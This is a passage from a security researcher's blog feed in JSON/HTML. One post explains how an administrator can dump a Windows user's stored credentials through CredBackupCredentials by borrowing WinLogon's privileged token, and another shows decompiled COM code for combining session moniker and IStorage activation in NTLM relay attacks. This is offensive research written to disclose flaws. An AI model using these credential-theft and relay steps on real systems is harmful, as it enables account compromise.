<i>CredpIsRpcClientTrusted</i>. This is only called by two APIs,&nbsp;<i>CredrReadByTokenHandle </i>and&nbsp;<i>CredrBackupCredentials </i>which are exported through the <i>CredReadByTokenHandle </i>and <i>CredBackupCredentials </i>APIs.</div><div><br /></div><div>The&nbsp;<i>CredReadByTokenHandle</i> API isn't that interesting, it's basically <i>CredRead</i> but allows the user to read from to be specified by providing the user's token. As far as I can tell reading a domain credential still returns a blank password.&nbsp;<i>CredBackupCredentials</i> on the other hand is interesting. It's the API used by <i>CREDWIZ.EXE</i> to backup a user's credentials, which can then be restored at a later time. This backup includes all credentials including domain credentials. The prototype for the API is as follows:</div><div><br /></div><div><span style=\"font-family: courier;\">BOOL WINAPI CredBackupCredentials(HANDLE Token,&nbsp;</span></div><div><span style=\"font-family: courier;\">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; LPCWSTR Path,&nbsp;</span></div><div><span style=\"font-family: courier;\">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; PVOID Password,&nbsp;</span></div><div><span style=\"font-family: courier;\">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; DWORD PasswordSize,&nbsp;</span></div><div><span style=\"font-family: courier;\">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; DWORD Flags);</span></div><div><br /></div><div>The backup process is slightly convoluted, first you run <i>CREDWIZ </i>on your desktop and select backup and specify the file you want to write the backup to. When you continue with the backup the process makes an RPC call to your <i>WinLogon </i>process with the credentials path which spawns a new copy of <i>CREDWIZ </i>on the secure desktop. At this point you're instructed to use CTRL+ALT+DEL to switch to the secure desktop. Here you type the password, which is used to encrypt the file to protect it at rest, and is needed when the credentials are restored. <i>CREDWIZ </i>will even ensure it meets your system's password policy for complexity, how generous.</div><div><br /></div><div><i>CREDWIZ </i>first stores the file to a temporary file, as LSASS encrypts the encrypted contents with the system DPAPI key. The file can be decrypted then written to the final destination, with appropriate impersonation etc.</div><div><br /></div><div>The only requirement for calling this API is having the&nbsp;<i>SeTrustedCredmanAccessPrivilege </i>privilege enabled. Assuming we're an administrator getting this privilege is easy as we can just borrow a token from another process. For example, checking for what processes have the privilege shows obviously <i>WinLogon</i> but also LSASS itself even though it arguably doesn't need it.</div><div><br /></div><div><span style=\"font-family: courier;\">PS&gt; $ts = Get-AccessibleToken</span></div><div><span style=\"font-family: courier;\">PS&gt; $ts | ? {&nbsp;</span></div><div><span style=\"font-family: courier;\">&nbsp; &nbsp;\"SeTrustedCredmanAccessPrivilege\" -in $_.ProcessTokenInfo.Privileges.Name&nbsp;</span></div><div><span style=\"font-family: courier;\">}</span></div><div><div><span style=\"font-family: courier;\">TokenId Access&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Name</span></div><div><span style=\"font-family: courier;\">------- ------&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ----</span></div><div><span style=\"font-family: courier;\">1A41253 GenericExecute|GenericRead&nbsp; &nbsp; LsaIso.exe:124</span></div><div><span style=\"font-family: courier;\">1A41253 GenericExecute|GenericRead&nbsp; &nbsp; &nbsp;lsass.exe:672</span></div><div><span style=\"font-family: courier;\">1A41253 GenericExecute|GenericRead winlogon.exe:1052</span></div><div><span style=\"font-family: courier;\">1A41253 GenericExecute|GenericRead atieclxx.exe:4364</span></div></div><div><br /></div><div>I've literally no idea what the <i>ATIECLXX.EXE</i>&nbsp;process is doing with&nbsp;<i>SeTrustedCredmanAccessPrivilege</i>, it's probably best not to ask ;-)</div><div><br /></div><div>To use this API to backup a user's credentials as an administrator you do the following.&nbsp;</div><div><ol style=\"text-align: left;\"><li>Open a <i>WinLogon </i>process for <i>PROCESS_QUERY_LIMITED_INFORMATION</i> access and get a handle to its token with <i>TOKEN_DUPLICATE</i> access.</li><li>Duplicate token into an impersonation token, then enable&nbsp;<i>SeTrustedCredmanAccessPrivilege.</i></li><li>Open a token to the target user, who must already be authenticated.</li><li>Call&nbsp;<i>CredBackupCredentials</i> while impersonating the <i>WinLogon</i> token passing a path to write to and a NULL password to disable the user encryption (just to make life easier). It's <i>CREDWIZ </i>which enforces the password policy not the API.</li><li>While still impersonating open the file and decrypt it using the&nbsp;<i>CryptUnprotectData </i>API, write back out the decrypted data.</li></ol><div>If it all goes well you'll have all the of the user's credentials in a packed binary format. I couldn't immediately find anyone documenting it, but people obviously have done before. I'll leave doing all this yourself as a exercise for the reader. I don't feel like providing an implementation.</div></div><div><br /></div><div class=\"separator\" style=\"clear: both; text-align: center;\"><a href=\"https://1.bp.blogspot.com/-AsVtziWSfY0/YKdV0_dbRMI/AAAAAAAAFo8/wTTnz-R63BolT_U51hhJ8i3URW3pe5_lACLcBGAsYHQ/s1069/backup_creds.PNG\" style=\"margin-left: 1em; margin-right: 1em;\"><img border=\"0\" height=\"228\" src=\"https://1.bp.blogspot.com/-AsVtziWSfY0/YKdV0_dbRMI/AAAAAAAAFo8/wTTnz-R63BolT_U51hhJ8i3URW3pe5_lACLcBGAsYHQ/w400-h228/backup_creds.PNG\" width=\"400\" /></a></div><div><br /></div>Why would you do this when there already exists plenty of other options? The main advantage, if you can call it that, it you never touch LSASS and definitely never inject any code into it. This wouldn't be possible anyway if LSASS is running as PPL. You also don't need to access the SECURITY hive to extract DPAPI credentials or know the user's password (assuming they're authenticated of course). About the only slightly suspicious thing is opening <i>WinLogon</i>&nbsp;to get a token, though there might be alternative approaches to get a suitable token.<br /><div><br /></div><div><br /></div><div><br /></div><p></p>", "links": [{"rel": "edit", "type": "application/atom+xml", "href": "https://www.blogger.com/feeds/4304739697716191998/posts/default/5533357868614285443"}, {"rel": "self", "type": "application/atom+xml", "href": "https://www.blogger.com/feeds/4304739697716191998/posts/default/5533357868614285443"}, {"rel": "alternate", "type": "text/html", "href": "https://www.tiraniddo.dev/2021/05/dumping-stored-credentials-with.html", "title": "Dumping Stored Credentials with SeTrustedCredmanAccessPrivilege"}], "authors": [{"name": "Unknown", "email": "noreply@blogger.com"}], "author_detail": {"name": "Unknown", "email": "noreply@blogger.com"}, "author": "Unknown (noreply@blogger.com)", "gd_image": {"rel": "http://schemas.google.com/g/2005#thumbnail", "width": "16", "height": "16", "src": "https://img1.blogblog.com/img/b16-rounded.gif"}, "media_thumbnail": [{"url": "https://1.bp.blogspot.com/-AsVtziWSfY0/YKdV0_dbRMI/AAAAAAAAFo8/wTTnz-R63BolT_U51hhJ8i3URW3pe5_lACLcBGAsYHQ/s72-w400-h228-c/backup_creds.PNG", "height": "72", "width": "72"}], "href": ""}, {"id": "tag:blogger.com,1999:blog-4304739697716191998.post-3047462974857219151", "guidislink": true, "link": "https://www.tiraniddo.dev/2021/04/standard-activating-yourself-to.html", "published": "2021-04-27T16:45:00.004-07:00", "published_parsed": [2021, 4, 27, 23, 45, 0, 1, 117, 0], "updated": "2021-04-27T16:45:57.592-07:00", "updated_parsed": [2021, 4, 27, 23, 45, 57, 1, 117, 0], "tags": [{"term": "COM", "scheme": "http://www.blogger.com/atom/ns#", "label": null}, {"term": "Exploit", "scheme": "http://www.blogger.com/atom/ns#", "label": null}, {"term": "Undocumented", "scheme": "http://www.blogger.com/atom/ns#", "label": null}, {"term": "Windows", "scheme": "http://www.blogger.com/atom/ns#", "label": null}], "title": "Standard Activating Yourself to Greatness", "title_detail": {"type": "text/plain", "language": null, "base": "https://www.tiraniddo.dev/feeds/posts/default", "value": "Standard Activating Yourself to Greatness"}, "content": [{"type": "text/html", "language": null, "base": "https://www.tiraniddo.dev/feeds/posts/default", "value": "<p>This week <a href=\"https://twitter.com/decoder_it\">@decoder_it</a> and <a href=\"https://twitter.com/splinter_code\">@splinter_code</a> <a href=\"https://labs.sentinelone.com/relaying-potatoes-dce-rpc-ntlm-relay-eop/\">disclosed</a> a new way of abusing DCOM/RPC NTLM relay attacks to access remote servers. This relied on the fact that if you're in logged in as a user on session 0 (such as through PowerShell remoting) and you call <a href=\"https://docs.microsoft.com/en-us/windows/win32/api/objbase/nf-objbase-cogetinstancefromistorage\">CoGetInstanceFromIStorage</a> the DCOM activator would create the object on the lowest interactive session rather than the session 0. Once an object is created the initial unmarshal of the IStorage object would happen in the context of the user authenticated to that session. If that happens to be a privileged user such as a Domain Administrator then the NTLM authentication could be relayed to a remote server and fun ensues.</p><p>The obvious problem with this attack is the requirement of being in session 0. Certainly it's possible a non-admin user might be allowed to authenticate to a system via PowerShell remoting but it'd be rarer than just being authenticated on a Terminal Server with multiple other users you could attack. It'd be nice if somehow you could pick the session that the object was created on.</p><p>Of course this already exists, you can use the <a href=\"https://docs.microsoft.com/en-us/windows/win32/termserv/session-to-session-activation-with-a-session-moniker\">session moniker</a> to activate an object cross-session (other than to session 0 which is special). I've abused this feature multiple times for cross-session attacks, such as <a href=\"https://bugs.chromium.org/p/project-zero/issues/detail?id=1021\">this</a>, <a href=\"https://bugs.chromium.org/p/project-zero/issues/detail?id=1224\">this</a> or <a href=\"https://bugs.chromium.org/p/project-zero/issues/detail?id=1683\">this</a>. I've repeated told Microsoft they need to fix this activation route as it makes no sense than a non-administrator can do it. But my warnings have not been heeded.&nbsp;</p><p>If you read the description of the session moniker you might notice a problem for us, it can't be combined with <i>IStorage</i> activation. The COM APIs only give us one or the other. However, if you poke around at the DCOM protocol documentation you'll notice that they are technically independent. The session activation is specified by setting the&nbsp;<i>dwSessionId</i> field in the&nbsp;<a href=\"https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/e175e4a0-daa0-4805-9004-5773245ce21a\">SpecialPropertiesData</a> activation property. And the marshalled <i>IStorage</i> object can be passed in the&nbsp;<i>ifdStg</i> field of the&nbsp;<a href=\"https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/b88422bb-778f-487c-aec9-2486feab7026\">InstanceInfoData</a>&nbsp;activation property. You package those activation properties up and send them to the&nbsp;<a href=\"https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/fd0682f8-8f5a-4082-830f-861c34db6251\">IRemoteSCMActivator</a> <a href=\"https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/c5917c4f-aaf5-46de-8667-bad7e495abf9\">RemoteGetClassObject</a> or <a href=\"https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/64af4c57-5466-4fdf-9761-753ea926a494\">RemoteCreateInstance</a>&nbsp;methods. Of course it's possible this won't really work, but at least they are independent properties and could be mixed.</p><p>The problem with testing this out is implementing DCOM activation is ugly. The activation properties first need to be NDR marshalled in a blob. They then need to be packaged up correctly before it can be sent to the activator. Also the documentation is only for remote activation which is not we want, and there are some weird quirks of local activation I'm not going to go into. Is there any documented way to access the activator without doing all this?</p><p>No, sorry. There is an undocumented way though if you're interested? Sure? Okay good, let's carry on. The key with these sorts of challenges is to just look at how the system already does it. Specifically we can look at how session moniker is activating the object and maybe from that we'll be lucky and we can reuse that for our own purposes.</p><p>Where to start? If you read <a href=\"https://docs.microsoft.com/en-us/windows/win32/termserv/using-a-session-moniker\">this</a> MSDN article you can see you need to call <a href=\"https://docs.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/platform-apis/ms775113(v=vs.85)\">MkParseDisplayNameEx</a> to create parse the string into a moniker. But that's really a wrapper over <a href=\"https://docs.microsoft.com/en-us/windows/win32/api/objbase/nf-objbase-mkparsedisplayname\">MkParseDisplayName</a> to provide URL moniker functionality which we don't care about. We'll just start at the&nbsp;<i>MkParseDisplayName </i>which is in OLE32.</p><div style=\"text-align: left;\"><span style=\"font-family: courier;\">HRESULT MkParseDisplayName(LPBC pbc, LPCOLESTR szUserName,&nbsp;<br />&nbsp; &nbsp; &nbsp; ULONG *pchEaten, LPMONIKER *ppmk) {<br />&nbsp; HRESULT hr = FindLUAMoniker(pbc, szUserName, &amp;pcchEaten, &amp;ppmk);<br />&nbsp; if (hr == MK_E_UNAVAILABLE)&nbsp;{<br />&nbsp; &nbsp; <span style=\"background-color: #b6d7a8;\">hr = FindSessionMoniker(pbc, szUserName, &amp;pcchEaten, &amp;ppmk);</span><br />&nbsp; }<br />&nbsp; // Parse rest of moniker.<br />}</span></div><p>Almost immediately we see a call to <i>FindSessionMoniker,</i>&nbsp;seems promising. Looking into that function we find what we need.</p><div style=\"text-align: left;\"><span style=\"font-family: courier;\">HRESULT FindSessionMoniker(LPBC pbc, LPCWSTR pszDisplayName,&nbsp;</span></div><div style=\"text-align: left;\"><span style=\"font-family: courier;\">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;ULONG *pchEaten, LPMONIKER *ppmk) {<br />&nbsp; DWORD dwSessionId = 0;<br />&nbsp; BOOL bConsole = FALSE;<br />&nbsp;&nbsp;<br />&nbsp; if (wcsnicmp(pszDisplayName, L\"Session:\", 8))<br />&nbsp; &nbsp; return MK_E_UNAVAILABLE;<br />&nbsp;&nbsp;<br />&nbsp;&nbsp;</span><span style=\"font-family: courier;\">if (!wcsnicmp(pszDisplayName + 8, L\"Console\", 7)) {</span><span style=\"font-family: courier;\"><div>&nbsp; &nbsp; dwConsole = TRUE;</div><div>&nbsp; &nbsp; *pcbEaten = 15;</div><div>&nbsp; } else {</div><div>&nbsp; &nbsp; <span style=\"background-color: #b6d7a8;\">LPWSTR EndPtr;</span></div><div><span style=\"background-color: #b6d7a8;\">&nbsp; &nbsp; dwSessionId = wcstoul(pszDisplayName + 8, &amp;End, 0);</span></div><div><span style=\"background-color: #b6d7a8;\">&nbsp; &nbsp; *pcbEaten = EndPtr - pszDisplayName;</span></div><div>&nbsp; }</div><div><br /></div>&nbsp; *ppmk = new CSessionMoniker(dwSessionId, bConsole);<br />&nbsp; return S_OK;<br />}</span></div><p style=\"text-align: left;\">This code parses out the session moniker data and then creates a new instance of the <i>CSessionMoniker </i>class. Of course this is not doing any activation yet. You don't use the session moniker in isolation, instead you're supposed to build a composite moniker with a new or <a href=\"https://docs.microsoft.com/en-us/windows/win32/api/objbase/nf-objbase-createclassmoniker\">class</a> moniker. The <i>MkParseDisplayName</i> API&nbsp;will keep parsing the string (which is why <i>pchEaten</i> is updated) and combine each moniker it finds. Therefore, if you have the moniker display name:</p><p style=\"text-align: left;\"><span style=\"font-family: courier;\">Session:3!clsid:0002DF02-0000-0000-C000-000000000046</span></p><p style=\"text-align: left;\">The API will return a composite moniker consisting of the session moniker for session 3 and the class moniker for CLSID&nbsp;<i>0002DF02-0000-0000-C000-000000000046</i> which is the <i>Browser Broker</i>. The example code then calls <a href=\"https://docs.microsoft.com/en-us/windows/win32/api/objidl/nf-objidl-imoniker-bindtoobject\">BindToObject</a> on the composite moniker, which first calls the right most moniker, which is the class moniker.</p><div style=\"text-align: left;\"><span style=\"font-family: courier;\">HRESULT CClassMoniker::BindToObject(LPBC pbc,&nbsp;<br />&nbsp; LPMONIKER pmkToLeft, REFIID riid, void **ppv) {<br />&nbsp; if (pmkToLeft) {<br />&nbsp; &nbsp; &nbsp; <span style=\"background-color: #b6d7a8;\">IClassActivator pClassActivator;<br />&nbsp; &nbsp; &nbsp; pmkToLeft-&gt;BindToObject(pcb, nullptr,&nbsp;<br />&nbsp; &nbsp; &nbsp; &nbsp; IID_IClassActivator, &amp;pClassActivator);<br />&nbsp; &nbsp; &nbsp; return pClassActivator-&gt;GetClassObject(m_clsid,&nbsp;<br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; CLSCTX_SERVER, 0, riid, ppv);</span><br />&nbsp; }<br />&nbsp; // ...<br />}</span></div><p>The <i>pmkToLeft </i>parameter is set by the composite moniker to the left moniker, which is the session moniker. We can see that the class moniker calls the session moniker's <i>BindToObject </i>method requesting an <a href=\"https://docs.microsoft.com/en-us/windows/win32/api/objidl/nn-objidl-iclassactivator\">IClassActivator </a>interface. It then calls the <a href=\"https://docs.microsoft.com/en-us/windows/win32/api/objidl/nf-objidl-iclassactivator-getclassobject\">GetClassObject</a> method, passing it the CLSID to activate. We're almost there.</p><div style=\"text-align: left;\"><span style=\"font-family: courier;\">HRESULT CSessionMoniker::GetClassObject(<br />&nbsp; &nbsp;REFCLSID pClassID, CLSCTX dwClsContext,&nbsp;<br />&nbsp; &nbsp;LCID locale, REFIID riid, void **ppv) {<br />&nbsp; <span style=\"background-color: #b6d7a8;\">IStandardActivator* pActivator;<br />&nbsp; CoCreateInstance(&amp;CLSID_ComActivator, NULL, CLSCTX_INPROC_SERVER,&nbsp;<br />&nbsp; &nbsp; IID_IStandardActivator, &amp;pActivator);</span><br />&nbsp;<br />&nbsp; <span style=\"background-color: #f9cb9c;\">ISpecialSystemProperties pSpecialProperties;<br />&nbsp; pActivator-&gt;QueryInterface(IID_ISpecialSystemProperties,&nbsp;<br />&nbsp; &nbsp; &nbsp; &amp;pSpecialProperties);<br />&nbsp; pSpecialProperties-&gt;SetSessionId(m_sessionid, m_console, TRUE);<br />&nbsp; return pActivator-&gt;StandardGetClassObject(pClassId, dwClsContext,&nbsp;<br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; NULL, riid, ppv);</span><br />}</span></div><p style=\"text-align: left;\">Finally the session moniker creates a new COM activator object with the <i>IStandardActivator </i>interface. It then queries for the <i>ISpecialSystemProperties </i>interface and sets the moniker's session ID and console state. It then calls the <i>StandardGetClassObject </i>method on the <i>IStandardActivator </i>and you should now have a COM server cross-session. None of these interface or the class are officially documented of course (AFAIK).</p><p>The $1000 question is, can you also do <i>IStorage </i>activation through the <i>IStandardActivator</i> interface? Poking around in COMBASE for the implementation of the interface you find one of its functions is:</p><div style=\"text-align: left;\"><span style=\"font-family: courier;\">HRESULT StandardGetInstanceFromIStorage(COSERVERINFO* pServerInfo,&nbsp;<br />&nbsp; REFCLSID pclsidOverride, IUnknown* punkOuter, CLSCTX dwClsCtx,&nbsp;<br />&nbsp; IStorage* pstg, int dwCount, MULTI_QI pResults[]);</span></div><p>It seems that the answer is yes. Of course it's possible that you still can't mix the two things up. That's why I wrote a quick and dirty example in C#, which is available <a href=\"https://gist.github.com/tyranid/c4a77598169e1a75b70c5a2c023bc5df\">here</a>. Seems to work fine. Of course I've not tested it out with the actual vulnerability to see it works in that scenario. That's something for others to do.</p>"}], "summary": "<p>This week <a href=\"https://twitter.com/decoder_it\">@decoder_it</a> and <a href=\"https://twitter.com/splinter_code\">@splinter_code</a> <a href=\"https://labs.sentinelone.com/relaying-potatoes-dce-rpc-ntlm-relay-eop/\">disclosed</a> a new way of abusing DCOM/RPC NTLM relay attacks to access remote servers. This relied on the fact that if you're in logged in as a user on session 0 (such as through PowerShell remoting) and you call <a href=\"https://docs.microsoft.com/en-us/windows/win32/api/objbase/nf-objbase-cogetinstancefromistorage\">CoGetInstanceFromIStorage</a> the DCOM activator would create the object on the lowest interactive session rather than the session 0. Once an object is created the initial unmarshal of the IStorage object would happen in the context of the user authenticated to that session. If that happens to be a privileged user such as a Domain Administrator then the NTLM authentication could be relayed to a remote server and fun ensues.</p><p>The obvious problem with this attack is the requirement of being in session 0. Certainly it's possible a non-admin user might be allowed to authenticate to a system via PowerShell remoting but it'd be rarer than just being authenticated on a Terminal Server with multiple other users you could attack. It'd be nice if somehow you could pick the session that the object was created on.</p><p>Of course this already exists, you can use the <a href=\"https://docs.microsoft.com/en-us/windows/win32/termserv/session-to-session-activation-with-a-session-moniker\">session moniker</a> to activate an object cross-session (other than to session 0 which is special). I've abused this feature multiple times for cross-session attacks, such as <a href=\"https://bugs.chromium.org/p/project-zero/issues/detail?id=1021\">this</a>, <a href=\"https://bugs.chromium.org/p/project-zero/issues/detail?id=1224\">this</a> or <a href=\"https://bugs.chromium.org/p/project-zero/issues/detail?id=1683\">this</a>. I've repeated told Microsoft they need to fix this activation route as it makes no sense than a non-administrator can do it. But my warnings have not been heeded.&nbsp;</p><p>If you read the description of the session moniker you might notice a problem for us, it can't be combined with <i>IStorage</i> activation. The COM APIs only give us one or the other. However, if you poke around at the DCOM protocol documentation you'll notice that they are technically independent. The session activation is specified by setting the&nbsp;<i>dwSessionId</i> field in the&nbsp;<a href=\"https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/e175e4a0-daa0-4805-9004-5773245ce21a\">SpecialPropertiesData</a> activation property. And the marshalled <i>IStorage</i> object can be passed in the&nbsp;<i>ifdStg</i> field of the&nbsp;<a href=\"https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/b88422bb-778f-487c-aec9-2486feab7026\">InstanceInfoData</a>&nbsp;activation property. You package those activation properties up and send them to the&nbsp;<a href=\"https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/fd0682f8-8f5a-4082-830f-861c34db6251\">IRemoteSCMActivator</a> <a href=\"https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/c5917c4f-aaf5-46de-8667-bad7e495abf9\">RemoteGetClassObject</a> or <a href=\"https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/64af4c57-5466-4fdf-9761-753ea926a494\">RemoteCreateInstance</a>&nbsp;methods. Of course it's possible this won't really work, but at least they are independent properties and could be mixed.</p><p>The problem with testing this out is implementing DCOM activation is ugly. The activation properties first need to be NDR marshalled in a blob. They then need to be packaged up correctly before it can be sent to the activator. Also the documentation is only for remote activation which is not we want, and there are some weird quirks of local activation I'm not going to go into. Is there any documented way to access the activator without doing all this?</p><p>No, sorry. There is an undocumented way though if you're interested? Sure? Okay good, let's carry on. The key with these sorts of challenges is to just look at how the system already does it. Specifically we can look at how session moniker is activating the object and maybe from that we'll be lucky and we can reuse that for our own purposes.</p><p>Where to start? If you read <a href=\"https://docs.microsoft.com/en-us/windows/win32/termserv/using-a-session-moniker\">this</a> MSDN article you can see you need to call <a href=\"https://docs.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/platform-apis/ms775113(v=vs.85)\">MkParseDisplayNameEx</a> to create parse the string into a moniker. But that's really a wrapper over <a href=\"https://docs.microsoft.com/en-us/windows/win32/api/objbase/nf-objbase-mkparsedisplayname\">MkParseDisplayName</a> to provide URL moniker functionality which we don't care about. We'll just start at the&nbsp;<i>MkParseDisplayName </i>which is in OLE32.</p><div style=\"text-align: left;\"><span style=\"font-family: courier;\">HRESULT MkParseDisplayName(LPBC pbc, LPCOLESTR szUserName,&nbsp;<br />&nbsp; &nbsp; &nbsp; ULONG *pchEaten, LPMONIKER *ppmk) {<br />&nbsp; HRESULT hr = FindLUAMoniker(pbc, szUserName, &amp;pcchEaten, &amp;ppmk);<br />&nbsp; if (hr == MK_E_UNAVAILABLE)&nbsp;{<br />&nbsp; &nbsp; <span style=\"background-color: #b6d7a8;\">hr = FindSessionMoniker(pbc, szUserName, &amp;pcchEaten, &amp;ppmk);</span><br />&nbsp; }<br />&nbsp; // Parse rest of moniker.<br />}</span></div><p>Almost immediately we see a call to <i>FindSessionMoniker,</i>&nbsp;seems promising. Looking into that function we find what we need.</p><div style=\"text-align: left;\"><span style=\"font-family: courier;\">HRESULT FindSessionMoniker(LPBC pbc, LPCWSTR pszDisplayName,&nbsp;</span></div><div style=\"text-align: left;\"><span style=\"font-family: courier;\">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;ULONG *pchEaten, LPMONIKER *ppmk) {<br />&nbsp; DWORD dwSessionId = 0;<br />&nbsp; BOOL bConsole = FALSE;<br />&nbsp;&nbsp;<br />&nbsp; if (wcsnicmp(pszDisplayName, L\"Session:\", 8))<br />&nbsp; &nbsp; return MK_E_UNAVAILABLE;<br />&nbsp;&nbsp;<br />&nbsp;&nbsp;</span><span style=\"font-family: courier;\">if (!wcsnicmp(pszDisplayName + 8, L\"Console\", 7)) {</span><span style=\"font-family: courier;\"><div>&nbsp; &nbsp; dwConsole = TRUE;</div><div>&nbsp; &nbsp; *pcbEaten = 15;</div><div>&nbsp; } else {</div><div>&nbsp; &nbsp; <span style=\"background-color: #b6d7a8;\">LPWSTR EndPtr;</span></div><div><span style=\"background-color: #b6d7a8;\">&nbsp; &nbsp; dwSessionId = wcstoul(pszDisplayName + 8, &amp;End, 0);</span></div><div><span style=\"background-color: #b6d7a8;\">&nbsp; &nbsp; *pcbEaten = EndPtr - pszDisplayName;</span></div><div>&nbsp; }</div><div><br /></div>&nbsp; *ppmk = new CSessionMoniker(dwSessionId, bConsole);<br />&nbsp; return S_OK;<br />}</span></div><p style=\"text-align: left;\">This code parses out the session moniker data and then creates a new instance of the <i>CSessionMoniker </i>class. Of course this is not doing any activation yet. You don't use the session moniker in isolation, instead you're supposed to build a composite moniker with a new or <a href=\"https://docs.microsoft.com/en-us/windows/win32/api/objbase/nf-objbase-createclassmoniker\">class</a> moniker. The <i>MkParseDisplayName</i> API&nbsp;will keep parsing the string (which is why <i>pchEaten</i> is updated) and combine each moniker it finds. Therefore, if you have the moniker display name:</p><p style=\"text-align: left;\"><span style=\"font-family: courier;\">Session:3!clsid:0002DF02-0000-0000-C000-000000000046</span></p><p style=\"text-align: left;\">The API will return a composite moniker consisting of the session moniker for session 3 and the class moniker for CLSID&nbsp;<i>0002DF02-0000-0000-C000-000000000046</i> which is the <i>Browser Broker</i>. The example code then calls <a href=\"https://docs.microsoft.com/en-us/windows/win32/api/objidl/nf-objidl-imoniker-bindtoobject\">BindToObject</a> on the composite moniker, which first calls the right most moniker, which is the class moniker.</p><div style=\"text-align: left;\"><span style=\"font-family: courier;\">HRESULT CClassMoniker::BindToObject(LPBC pbc,&nbsp;<br />&nbsp; LPMONIKER pmkToLeft, REFIID riid, void **ppv) {<br />&nbsp; if (pmkToLeft) {<br />&nbsp; &nbsp; &nbsp; <span style=\"background-color: #b6d7a8;\">IClassActivator pClassActivator;<br />&nbsp; &nbsp; &nbsp; pmkToLeft-&gt;BindToObject(pcb, nullptr,&nbsp;<br />&nbsp; &nbsp; &nbsp; &nbsp; IID_IClassActivator, &amp;pClassActivator);<br />&nbsp; &nbsp; &nbsp; return pClassActivator-&gt;GetClassObject(m_clsid,&nbsp;<br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; CLSCTX_SERVER, 0, riid, ppv);</span><br />&nbsp; }<br />&nbsp; // ...<br />}</span></div><p>The <i>pmkToLeft </i>parameter is set by the composite moniker to the left moniker, which is the session moniker. We can see that the class moniker calls the session moniker's <i>BindToObject </i>method requesting an <a href=\"https://docs.microsoft.com/en-us/windows/win32/api/objidl/nn-objidl-iclassactivator\">IClassActivator </a>interface. It then calls the <a href=\"https://docs.microsoft.com/en-us/windows/win32/api/objidl/nf-objidl-iclassactivator-getclassobject\">GetClassObject</a> method, passing it the CLSID to activate. We're almost there.</p><div style=\"text-align: left;\"><span style=\"font-family: courier;\">HRESULT CSessionMoniker::GetClassObject(<br />&nbsp; &nbsp;REFCLSID pClassID, CLSCTX dwClsContext,&nbsp;<br />&nbsp; &nbsp;LCID locale, REFIID riid, void **ppv) {<br />&nbsp; <span style=\"background-color: #b6d7a8;\">IStandardActivator* pActivator;<br />&nbsp; CoCreateInstance(&amp;CLSID_ComActivator, NULL, CLSCTX_INPROC_SERVER,&nbsp;<br />&nbsp; &nbsp; IID_IStandardActivator, &amp;pActivator);</span><br />&nbsp;<br />&nbsp; <span style=\"background-color: #f9cb9c;\">ISpecialSystemProperties pSpecialProperties;<br />&nbsp; pActivator-&gt;QueryInterface(IID_ISpecialSystemProperties,&nbsp;<br />&nbsp; &nbsp; &nbsp; &amp;pSpecialProperties);<br />&nbsp; pSpecialProperties-&gt;SetSessionId(m_sessionid, m_console, TRUE);<br />&nbsp; return pActivator-&gt;StandardGetClassObject(pClassId, dwClsContext,&nbsp;<br />&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; NULL, riid, ppv);</span><br />}</span></div><p style=\"text-align: left;\">Finally the session moniker creates a new COM activator object with the <i>IStandardActivator </i>interface. It then queries for the <i>ISpecialSystemProperties </i>interface and sets the moniker's session ID and console state. It then calls the <i>StandardGetClassObject </i>method on the <i>IStandardActivator </i>and you should now have a COM server cross-session. None of these interface or the class are officially documented of course (AFAIK).</p><p>The $1000 question is, can you also do <i>IStorage </i>activation through the <i>IStandardActivator</i> interface? Poking around in COMBASE for the implementation of the interface you find one of its functions is:</p><div style=\"text-align: left;\"><span style=\"font-family: courier;\">HRESULT StandardGetInstanceFromIStorage(COSERVERINFO* pServerInfo,&nbsp;<br />&nbsp; REFCLSID pclsidOverride, IUnknown* punkOuter, CLSCTX dwClsCtx,&nbsp;<br />&nbsp; IStorage* pstg, int 